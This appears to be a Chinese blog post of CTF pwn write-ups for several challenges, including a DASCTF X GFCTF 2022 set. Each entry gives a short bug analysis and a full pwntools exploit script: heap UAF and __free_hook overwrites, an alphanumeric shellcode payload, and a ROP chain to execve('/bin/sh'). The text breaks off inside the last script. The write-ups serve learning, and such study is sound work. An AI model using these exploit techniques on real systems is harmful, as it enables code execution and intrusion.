<h2 id="cgrasstring"><a href="#cgrasstring" class="headerlink" title="cgrasstring"></a>cgrasstring</h2><h3 id="程序分析-2"><a href="#程序分析-2" class="headerlink" title="程序分析"></a>程序分析</h3><p>程序功能大致为：</p>
<ul>
<li>add: 申请一个chunk，同时使用point和note保存，函数中会使用一个string去接收用户的输入，返回时释放。</li>
<li>change: 修改chunk大小和内容，使用的是resize，和realloc的作用差不多，并且只更新了note而没更新point，存在UAF</li>
<li>show: 打印point的内容。</li>
</ul>
<h3 id="解题思路-4"><a href="#解题思路-4" class="headerlink" title="解题思路"></a>解题思路</h3><ol>
<li>由于没有remove功能，但是能使用resize来达到释放的效果，从而利用uaf</li>
<li>填满tcache，然后利用uaf泄漏libc</li>
<li>利用uaf修改任意tcache的fd为任意地址</li>
</ol>
<h3 id="exp-5"><a href="#exp-5" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># s=ssh(host=host,port=port,user=&#x27;CTFMan&#x27;,password=&#x27;guest&#x27;)</span></span><br><span class="line"><span class="comment"># io=s.run(&#x27;/bin/bash&#x27;)</span></span><br><span class="line"></span><br><span class="line">io=process(<span class="string">&#x27;./cgrasstring&#x27;</span>)</span><br><span class="line"><span class="comment"># io=remote(path)</span></span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./cgrasstring&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#libc_file=&#x27;./libc-2.27.so&#x27;</span></span><br><span class="line"></span><br><span class="line">s=<span class="keyword">lambda</span> x:io.send(x)</span><br><span class="line">sa=<span class="keyword">lambda</span> x,y:io.sendafter(x,y)</span><br><span class="line">sl=<span class="keyword">lambda</span> x:io.sendline(x)</span><br><span class="line">sla=<span class="keyword">lambda</span> x,y:io.sendlineafter(x,y)</span><br><span class="line">r=<span class="keyword">lambda</span> x:io.recv(x)</span><br><span class="line">ru=<span class="keyword">lambda</span> x:io.recvuntil(x)</span><br><span class="line">debug=<span class="keyword">lambda</span>:gdb.attach(io)	</span><br><span class="line"></span><br><span class="line">choose=<span class="keyword">lambda</span> x:sla(<span class="string">&quot;Your choice:&quot;</span>,<span class="built_in">str</span>(x))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">    choose(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">&quot;size:&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    sla(<span class="string">&quot;content:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,size,content</span>):</span></span><br><span class="line">    choose(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">&quot;idx&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">&quot;size&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    sla(<span class="string">&quot;content&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    choose(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">&quot;idx&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="comment">#add(0x20,&#x27;&#x27;)#0</span></span><br><span class="line"><span class="comment">#edit(0,0x30,&#x27;&#x27;)</span></span><br><span class="line"><span class="comment">#show(0)</span></span><br><span class="line"><span class="comment">#ru(&quot;Now you see it:&quot;)</span></span><br><span class="line"><span class="comment">#heap=u64(r(6).ljust(8,&#x27;\0&#x27;))-0x11e0a</span></span><br><span class="line"><span class="comment">#print hex(heap)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0x80</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    edit(i,<span class="number">0x90</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">6</span>)</span><br><span class="line">libc_base=u64(ru(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\0&#x27;</span>))-<span class="number">0x3ebc0a</span></span><br><span class="line">libc=elf.libc</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(libc_base)</span><br><span class="line"></span><br><span class="line">free_hook=libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]+libc_base</span><br><span class="line">edit(<span class="number">5</span>,<span class="number">0x90</span>,p64(free_hook))</span><br><span class="line"></span><br><span class="line">system=libc.sym[<span class="string">&#x27;system&#x27;</span>]+libc_base</span><br><span class="line">add(<span class="number">0x80</span>,p64(system))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;/bin/sh\0&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(free_hook)</span><br><span class="line">debug()</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="ez-note"><a href="#ez-note" class="headerlink" title="ez_note"></a>ez_note</h2><h3 id="程序分析-3"><a href="#程序分析-3" class="headerlink" title="程序分析"></a>程序分析</h3><p>程序大致流程：</p>
<ul>
<li>add: 使用malloc申请0x80到0x400大小的chunk，输入size后会进行会进行检测，并强行转换size为int型，因此存在漏洞</li>
<li>remove: 释放chunk</li>
<li>show: 打印chunk内容</li>
</ul>
<h3 id="解题思路-5"><a href="#解题思路-5" class="headerlink" title="解题思路"></a>解题思路</h3><ol>
<li>add中存在漏洞，输入一个4字节以上的size即可通过检测，溢出</li>
<li>溢出修改下一个chunk的size，构造堆重叠并将chunk放入unsorted_bin</li>
<li>申请一个chunk，泄漏libc</li>
<li>在申请一个能够修改某tcache_fd的chunk，修改为任意地址</li>
</ol>
<h3 id="exp-6"><a href="#exp-6" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># s=ssh(host=host,port=port,user=&#x27;CTFMan&#x27;,password=&#x27;guest&#x27;)</span></span><br><span class="line"><span class="comment"># io=s.run(&#x27;/bin/bash&#x27;)</span></span><br><span class="line"></span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment"># io=remote(path)</span></span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc_file=<span class="string">&#x27;./libc-2.31.so&#x27;</span></span><br><span class="line"></span><br><span class="line">s=<span class="keyword">lambda</span> x:io.send(x)</span><br><span class="line">sa=<span class="keyword">lambda</span> x,y:io.sendafter(x,y)</span><br><span class="line">sl=<span class="keyword">lambda</span> x:io.sendline(x)</span><br><span class="line">sla=<span class="keyword">lambda</span> x,y:io.sendlineafter(x,y)</span><br><span class="line">r=<span class="keyword">lambda</span> x:io.recv(x)</span><br><span class="line">ru=<span class="keyword">lambda</span> x:io.recvuntil(x)</span><br><span class="line">debug=<span class="keyword">lambda</span>:gdb.attach(io)	</span><br><span class="line"></span><br><span class="line">choose=<span class="keyword">lambda</span> x:sla(<span class="string">&quot;Your choice:&quot;</span>,<span class="built_in">str</span>(x))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">    choose(<span class="number">1</span>)</span><br><span class="line">    sa(<span class="string">&quot;Note size:&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    sla(<span class="string">&quot;Note content:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    choose(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">&quot;Note ID:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    choose(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">&quot;Note ID:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x400</span>,<span class="string">&#x27;&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x400</span>,<span class="string">&#x27;&#x27;</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x400</span>,<span class="string">&#x27;&#x27;</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x400</span>,<span class="string">&#x27;&#x27;</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x400</span>,<span class="string">&#x27;&#x27;</span>)<span class="comment">#4</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;\0&#x27;</span>*<span class="number">0x408</span>+p64(<span class="number">0x821</span>)</span><br><span class="line">add(<span class="number">0x100000400</span>,payload)<span class="comment">#0</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x400</span>,<span class="string">&#x27;&#x27;</span>)<span class="comment">#2</span></span><br><span class="line"></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">main_arena=u64(ru(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line">libc_base=main_arena-<span class="number">0x1ebbe0</span></span><br><span class="line"><span class="comment">#libc=elf.libc</span></span><br><span class="line">libc=ELF(libc_file)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(libc_base)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x400</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">free_hook=libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;\0&#x27;</span>*<span class="number">0x408</span>+p64(<span class="number">0x411</span>)+p64(free_hook)</span><br><span class="line">add(<span class="number">0x100000400</span>,payload)<span class="comment">#0</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x400</span>,<span class="string">&#x27;/bin/sh&#x27;</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x400</span>,p64(system))<span class="comment">#2</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(free_hook)</span><br><span class="line">debug()</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="appetizer"><a href="#appetizer" class="headerlink" title="appetizer"></a>appetizer</h2><p>让我再想想</p>
<h1 id="DASCTF-X-GFCTF-2022十月挑战赛"><a href="#DASCTF-X-GFCTF-2022十月挑战赛" class="headerlink" title="DASCTF X GFCTF 2022十月挑战赛!"></a>DASCTF X GFCTF 2022十月挑战赛!</h1><p>官方wp十分详细，学到了许多(一道没做出来)</p>
<h2 id="1-5"><a href="#1-5" class="headerlink" title="1!5!"></a>1!5!</h2><h3 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h3><p>仅一个输入点，地址是mmap得到的，然后还会调用，很明显是注入shellcode。</p>
<p>但内容需要过一个check：</p>
<ul>
<li>每个字节都必须在’15aABCDEFGHIJKLMNOPQRSUVWXYZ’中</li>
<li>长度为0x200</li>
</ul>
<p>老实说，我只会用工具来生成明文shellcode。之前也做师兄出的与其他比赛的明文shellcode题，但稍微需要变化一点，我就不行了，这次wp却很详细的把整个过程给写了出来，真是太感动了。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># s=ssh(host=host,port=port,user=&#x27;CTFMan&#x27;,password=&#x27;guest&#x27;)</span></span><br><span class="line"><span class="comment"># io=s.run(&#x27;/bin/bash&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#io=process(&#x27;./pwn_1&#x27;)</span></span><br><span class="line">io=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25024</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn_1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#libc_file=&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">s=<span class="keyword">lambda</span> x:io.send(x)</span><br><span class="line">sa=<span class="keyword">lambda</span> x,y:io.sendafter(x,y)</span><br><span class="line">sl=<span class="keyword">lambda</span> x:io.sendline(x)</span><br><span class="line">sla=<span class="keyword">lambda</span> x,y:io.sendlineafter(x,y)</span><br><span class="line">r=<span class="keyword">lambda</span> x:io.recv(x)</span><br><span class="line">ru=<span class="keyword">lambda</span> x:io.recvuntil(x)</span><br><span class="line">debug=<span class="keyword">lambda</span> y:gdb.attach(io,gdbscript=y)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;RX5AAAA5AEAAPY5AABA5AECA51A1A5WD1I1AB551115Z1PA5aMaW1AF5AAPF5KPaa1AJ511A15ZBDA5aCZW1ANPQX5AAAA5QAAAPYX511AA5KBDG5aCZa1AB5A1115W1115a1YH1AF5111151A115WP111AJ511115K5115aD111ANPQX5QAAA5aAAAPYX51111515115HDYY1AB5111151PA151aM11AF5111A51PAH51aMa1AJ51AA551YYD5Yaaa1ANPQX5AAAA5QAAAPYX51AA151BS151XaH1AB51RAA5VaKQ1AF5ARUA5ZaaP1AJ5DCDR5aaYa1ANPQX5AAAA51AAAPYX51AQC5EPaa1AB511A151ADA5DCZa1AF5HC1R5aaJa1AJ5PAEC5aPaa1ANPQX5AAAA5QAAAPYX5ARCA5UaaP1AB5DCBR5aaXa1AF5AAYC5GPaa1AJ511115AAU15MOaH1AN511115KADP5aOXa1ARQX51AAA5aEAAP&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line">payload=payload.ljust(<span class="number">0x200</span>,<span class="string">&#x27;\x90&#x27;</span>)</span><br><span class="line"><span class="comment">#debug(&#x27;b *$rebase(0x000012cf)&#x27;)</span></span><br><span class="line">s(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="R-P"><a href="#R-P" class="headerlink" title="R()P"></a>R()P</h2><p>以前从来没觉得构造ropchain那么难过，这次gadget稍微罕见了一点，我连找都没找到。幸好wp还是十分详细，让我知道了自己的基础有多薄弱。</p>
<h3 id="逆向-1"><a href="#逆向-1" class="headerlink" title="逆向"></a>逆向</h3><ol>
<li>保护仅开启NX与partial RELRO</li>
<li>就两个read，存在栈溢出</li>
</ol>
<h3 id="解题思路-6"><a href="#解题思路-6" class="headerlink" title="解题思路"></a>解题思路</h3><p>确立我们需要执行系统调用<code>execve(&quot;/bin/sh&quot;,0,0)</code>所需要的指定寄存器的数值：rax=59,*rdi=”/bin/sh”,rsi=0|*rdi=0,rdx=0|*rdx=0</p>
<p>然后构造ROPchain，但是因为是高版本编译，所以没有csu。寻找好用的gadget也比较难，官方wp中提供的wp如下:</p>
<ul>
<li><code>0x00401099 : mov edi, 0x404018 ; jmp rax</code><br>  控制edi为固定地址</li>
<li><code>0x0040116d : mov eax, dword ptr [rsp + 0xc] ; add rsp, 0x18 ; ret</code><br>  栈上的内容可以直接控制rax</li>
<li><code>0x00401141 : lea rsi, [rsp + 0xc];……;ret</code><br>  栈上内容直接控制rsi，但是后面还有一个read的调用</li>
<li><code>0x0040115d : mov edx, dword [rsp + 0xc];……;ret</code><br>  栈上内容直接控制edx，后面也跟着一个read的调用</li>
</ul>
<p>gadget基本都是main里面找的，除了控制edi的那条(可以通过ROPgadget搜出来)，也决定了任意写需要将”/bin/sh”写入0x404018，这个地址正好权限是rw，且之后是<code>jmp rax</code>可以被控制。</p>
<p>然后是控制read进行任意写:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">0x00401155     lea rax, [rsp + 8]</span><br><span class="line">0x0040115a     mov rsi, rax                ; void *buf</span><br><span class="line">0x0040115d     mov edx, dword [nbyte]      ; size_t nbyte</span><br><span class="line">0x00401161     xor edi, edi                ; int fildes</span><br><span class="line">0x00401163     mov eax, 0</span><br><span class="line">0x00401168     call sym.imp.read           ; ssize_t read(int fildes, void *buf, size_t nb    yte)</span><br><span class="line">0x0040115a     mov rsi, rax                ; void *buf</span><br><span class="line">0x0040115d     mov edx, dword [nbyte]      ; size_t nbyte</span><br><span class="line">0x00401161     xor edi, edi                ; int fildes</span><br><span class="line">0x00401163     mov eax, 0</span><br><span class="line">0x00401168     call sym.imp.read           ; ssize_t read(int fildes, void *buf, size_t nb    yte)</span><br></pre></td></tr></table></figure>

<p>若能控制rax，则从0x40115a开始利用来任意写。</p>
<p>大概整个执行流程为：</p>
<ol>
<li>将”/bin/sh”写入0x404018，控制rax后直接调用0x0040115a即可 45 2. 接着设置rax为read_got，接着爆破，将read_got置为syscall</li>
<li>然后控制*rax=ret，置edi为0x404018</li>
<li>最后将rax置为59，rsi置为0，同时调用read(syscall)</li>
</ol>
<h3 id="exp-7"><a href="#exp-7" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># s=ssh(host=host,port=port,user=&#x27;CTFMan&#x27;,password=&#x27;guest&#x27;)</span></span><br><span class="line"><span class="comment"># io=s.run(&#x27;/bin/bash&#x27;)</span></span><br><span class="line"></span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment"># io=remote(path)</span></span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#libc_file=&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">s=<span class="keyword">lambda</span> x:io.send(x)</span><br><span class="line">sa=<span class="keyword">lambda</span> x,y:io.sendafter(x,y)</span><br><span class="line">sl=<span class="keyword">lambda</span> x:io.sendline(x)</span><br><span class="line">sla=<span class="keyword">lambda</span> x,y:io.sendlineafter(x,y)</span><br><span class="line">r=<span class="keyword">lambda</span> x:io.recv(x)</span><br><span class="line">ru=<span class="keyword">lambda</span> x:io.recvuntil(x)</span><br><span class="line">debug=<span class="keyword">lambda</span> x:gdb.attach(io,gdbscript=x)</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug(&#x27;b *0x00401171&#x27;)</span></span><br><span class="line"></span><br><span class="line">read_got=elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"></span><br><span class="line">binsh=<span class="number">0x404018</span></span><br><span class="line">read=<span class="number">0x00401155</span></span><br><span class="line">ret=<span class="number">0x000000000040101a</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">modrax</span>(<span class="params">content</span>):</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(content)&lt;=<span class="number">4</span>:</span><br><span class="line">        payload=<span class="string">b&#x27;&#x27;</span></span><br><span class="line">        payload+=p64(<span class="number">0x0040116d</span>)<span class="comment">#rsp</span></span><br><span class="line">        payload+=p64(<span class="number">0</span>)+p32(<span class="number">0</span>)</span><br><span class="line">        payload+=content</span><br><span class="line">        payload+=p64(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> payload</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;length wrong&#x27;</span>)</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">modrdi</span>():</span></span><br><span class="line">    payload=<span class="string">b&#x27;&#x27;</span></span><br><span class="line">    payload+=p64(<span class="number">0x00401099</span>)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">modrsi</span>(<span class="params">content</span>):</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(content)&lt;=<span class="number">4</span>:</span><br><span class="line">        payload=<span class="string">b&#x27;&#x27;</span></span><br><span class="line">        payload+=p64(<span class="number">0x00401141</span>)</span><br><span class="line">        payload+=p64(<span class="number">0</span>)+p32(<span class="number">0</span>)</span><br><span class="line">        payload+=content</span><br><span class="line">        payload+=p64(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> payload</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;length wrong&#x27;</span>)</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">readpay</span>(<span class="params">content</span>):</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(content)&lt;=<span class="number">4</span>:</span><br><span class="line">        payload=<span class="string">b&#x27;&#x27;</span></span><br><span class="line">        payload+=p64(read+<span class="number">5</span>)<span class="comment">#rsp</span></span><br><span class="line">        payload+=p64(<span class="number">0</span>)+p32(<span class="number">0</span>)</span><br><span class="line">        payload+=content</span><br><span class="line">        payload+=p64(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> payload</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;length wrong&#x27;</span>)</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line">payload=p32(<span class="number">0x100</span>)</span><br><span class="line">s(payload)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span></span><br><span class="line">payload+=modrax(p32(binsh))</span><br><span class="line">payload+=readpay(p32(read_got))</span><br><span class="line">payload+=readpay(p32(binsh+<span class="number">8</span>))</span><br><span class="line">payload+=modrax(p32(ret))</span><br><span class="line">payload+=modrdi()</span><br><span class="line">payload+=modrax(p32(<span class="number">59</span>))</span><br><span class="line">payload+=modrsi(p32(<span class="number">0</span>))</span><br><span class="line">s(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#input()</span></span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">s(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#input()</span></span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">s(<span class="string">&#x27;\xb0\x70&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="Magic-Book"><a href="#Magic-Book" class="headerlink" title="Magic_Book"></a>Magic_Book</h2><h3 id="逆向-2"><a href="#逆向-2" class="headerlink" title="逆向"></a>逆向</h3><p>三个功能：</p>
<ul>
<li>add：申请小于0x100大小的chuank，能用0x13次</li>
<li>remove：释放chunk，能用0x13次</li>
<li>gift：释放chunk，但有uaf，只能用一次</li>
</ul>
<h3 id="做题思路"><a href="#做题思路" class="headerlink" title="做题思路"></a>做题思路</h3><p>wp给出的构造方法十分巧妙，首先利用house_of_botcake来将chunk dup至tcache与unsortedbin中。由于程序缺少输出，因此一开始只能使用爆破来确定stdout与heap的地址，因此我们同时需要用到一个libc地址和一个heap地址。构造堆重叠，将_2_1_stdout的地址链入tcache_chain中。泄漏libc后用相同的方法来修改free_hook，最终getshell。</p>
<p>大概过程为：</p>
<ol>
<li>填满tcache链</li>
<li>再释放两个相同大小chunk，合并为一个unsorterbin_chunk，取出tcache中的一个chunk，并将unsortedbin中一个uaf释放进入tcache</li>
<li>从unsortedbin中申请两个chunk，其中一个与被dup的chunk重叠，然后这两个chunk的内容分别需要覆盖libc_fcn地址为_2_1_stdout的地址与dup_chunk的fd为指向_2_1_stdout的地址的chunk(将_2_1_stdout链入tcache_chain)，共需要爆破一个字节</li>
<li>利用stdout泄漏libc后，同样利用该重叠将free_hook链入tcache_chain，最后getshell</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># s=ssh(host=host,port=port,user=&#x27;CTFMan&#x27;,password=&#x27;guest&#x27;)</span></span><br><span class="line"><span class="comment"># io=s.run(&#x27;/bin/bash&#x27;)</span></span><br><span class="line"></span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment"># io=remote(path)</span></span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc_file=<span class="string">&#x27;/pwn/libc&#x27;</span></span><br><span class="line"></span><br><span class="line">s=<span class="keyword">lambda</span> x:io.send(x)</span><br><span class="line">sa=<span class="keyword">lambda</span> x,y:io.sendafter(x,y)</span><br><span class="line">sl=<span class="keyword">lambda</span> x:io.sendline(x)</span><br><span class="line">sla=<span class="keyword">lambda</span> x,y:io.sendlineafter(x,y)</span><br><span class="line">r=<span class="keyword">lambda</span> x:io.recv(x)</span><br><span class="line">ru=<span class="keyword">lambda</span> x:io.recvuntil(x)</span><br><span class="line">debug=<span class="keyword">lambda</span> x:gdb.attach(io,gdbscript=x)	</span><br><span class="line"></span><br><span class="line">choose=<span class="keyword">lambda</span> x:sla(<span class="string">&quot;Your choice : &quot;</span>,<span class="built_in">str</span>(x))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">    choose(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">&quot;Size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    sa(<span class="string">&quot;Content: &quot;</span>,content)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    choose(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gift</span>(<span class="params">idx</span>):</span></span><br><span class="line">    choose(<span class="number">9</span>)</span><br><span class="line">    sla(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    add(<span class="number">0x80</span>,<span class="string">&#x27;MEssa&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    free(i)</span><br><span class="line"></span><br><span class="line">gift(<span class="number">8</span>)</span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>,<span 